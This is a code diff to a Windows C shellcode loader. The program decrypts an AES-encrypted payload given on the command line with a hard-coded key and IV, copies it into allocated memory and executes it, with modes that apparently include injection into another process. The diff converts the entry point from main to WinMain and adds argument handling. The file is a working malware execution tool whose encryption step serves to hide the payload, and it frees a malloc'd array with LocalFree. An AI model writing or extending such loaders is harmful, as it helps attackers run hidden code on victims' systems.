@@ -128,7 +128,6 @@ void run_shellcode_local(unsigned char *shellcode, size_t shellcode_len) {
     if (status != 0) {
         return;
     }
-
     memcpy(baseAddress, shellcode, shellcode_len);
 
     ((void(*)())baseAddress)();
@@ -207,26 +206,55 @@ unsigned char *convert_shellcode(const char *shellcode, size_t *binary_length) {
     return binary_shellcode;
 }
 
-int main(int argc, char *argv[]) {
-    if (argc < 3) {
+//int main(int argc, char *argv[]) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    
+    AllocConsole();
+    FILE* fDummy;
+    freopen_s(&fDummy, "CONOUT$", "w", stdout);
+
+    // Get arguments in Unicode first
+    int argc;
+    LPWSTR* wargv = CommandLineToArgvW(GetCommandLineW(), &argc);
+    
+    if (wargv == NULL) {
         return 1;
     }
+
+    // Allocate array of char pointers
+    char** argv = (char**)malloc(argc * sizeof(char*));
     
+    // Convert each argument from Unicode to ANSI
+    for (int i = 0; i < argc; i++) {
+        // Get required buffer size
+        int size = WideCharToMultiByte(CP_ACP, 0, wargv[i], -1, NULL, 0, NULL, NULL);
+        // Allocate buffer
+        argv[i] = (char*)malloc(size);
+        // Convert to ANSI
+        WideCharToMultiByte(CP_ACP, 0, wargv[i], -1, argv[i], size, NULL, NULL);
+    }
+
+
+    // Sample AES key and IV
     unsigned char aes_key_hex[] = "dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327";
     unsigned char aes_iv_hex[] = "d48e8f872066162eabde33152dc604c6";
     unsigned char *decrypted_shellcode;
     size_t decrypted_shellcode_len = 0;
 
-    const char *shellcode = argv[1];
+    // Assuming the shellcode is passed as the first argument
+    const char *shellcode = argv[1];  // This is argv[1], not argv[0]
 
+    // Assuming decrypt_aes() is implemented properly
     decrypt_aes(aes_key_hex, aes_iv_hex, shellcode, &decrypted_shellcode, &decrypted_shellcode_len);
-
+    
+    // Convert the decrypted shellcode into binary form
     size_t shellcode_binary_length = 0;
     unsigned char *shellcode_binary = convert_shellcode((const char *)decrypted_shellcode, &shellcode_binary_length);
     if (!shellcode_binary) {
-        return 1;
+        return 0;  // Return error if conversion fails
     }
 
+    // Check the mode and call corresponding function
     const char *mode = argv[2];
     const char *process = argc > 3 ? argv[3] : NULL;
 
@@ -236,7 +264,12 @@ int main(int argc, char *argv[]) {
         printf("Not implemented yet.\n");
     }
 
+    // Free dynamically allocated memory
     free(shellcode_binary);
     free(decrypted_shellcode);
+
+    LocalFree(argv);
+    FreeConsole();
+
     return 0;
 }
